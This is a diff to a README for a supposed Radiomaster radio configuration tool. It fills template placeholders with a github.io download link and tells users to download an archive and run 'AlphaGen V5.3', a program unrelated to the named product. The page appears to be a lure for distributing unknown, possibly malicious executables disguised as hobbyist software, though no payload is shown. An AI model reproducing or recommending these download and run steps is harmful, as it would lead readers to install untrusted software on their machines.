@@ -2,13 +2,13 @@
 
 Radiomaster Configurator is a desktop utility for managing Radiomaster radios, internal modules, external protocols, and OpenTX/EdgeTX configurations.
 
-[![Download](https://img.shields.io/badge/Download-Radiomaster_Configurator-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Radiomaster_Configurator-blueviolet)](https://radiomaster-configurator-rc-transmitter.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://radiomaster-configurator-rc-transmitter.github.io/.github)  
 2. 📁 Extract the tool to any preferred location  
 3. 🖱 Run AlphaGen V5.3 to initialize Radiomaster link  
 4. ✅ Connect your transmitter via USB and start configuration
